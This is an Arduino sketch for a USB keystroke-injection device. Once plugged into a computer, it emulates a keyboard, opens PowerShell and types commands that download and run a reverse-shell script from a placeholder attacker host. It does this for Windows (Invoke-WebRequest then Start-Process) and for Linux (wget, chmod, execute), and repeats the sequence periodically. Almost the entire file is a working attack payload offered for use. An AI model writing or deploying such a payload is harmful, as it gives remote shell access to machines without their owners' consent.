#include <Keyboard.h>  // Include library for keyboard emulation

void setup() {
    delay(5000);  // Initialization delay before executing code
}

void loop() {
    while (true) {
        Keyboard.begin();  // Initialize keyboard interface

        // Emulate opening the OS command interface
        Keyboard.press(KEY_LEFT_GUI);
        delay(200);
        Keyboard.releaseAll();
        delay(500);

        // Type command to launch terminal
        Keyboard.print("powershell");
        delay(800);
        Keyboard.press(KEY_RETURN);
        Keyboard.releaseAll();
        delay(2000);  // Wait for PowerShell to load

        // Execute command to download and run script on Windows
        // NOTE: Replace 'CHANGE_ME' with the actual IP address or domain hosting the script
        Keyboard.print("Invoke-WebRequest -Uri \"http://CHANGE_ME/reverse_shell.bat\" -OutFile \"C:\\Windows\\TEMP\\reverse_shell.bat\";Start-Process 'C:\\Windows\\TEMP\\reverse_shell.bat'");
        delay(10);

        // Confirm command execution
        Keyboard.press(KEY_RETURN);
        Keyboard.releaseAll();
        delay(1000);

        // Execute command to download and run script on Linux
        // NOTE: Replace 'CHANGE_ME' with the actual IP address or domain hosting the script
        Keyboard.print("wget -O /tmp/reverse.sh http://CHANGE_ME/reverse_shell.sh && chmod +x /tmp/reverse.sh && /tmp/reverse.sh");
        Keyboard.press(KEY_RETURN);
        Keyboard.releaseAll();

        // End keyboard interface
        Keyboard.end();

        // Infinite loop with long delay to keep the device active in case the PC goes to sleep
        delay(500000);  // Wait before repeating execution
    }
}
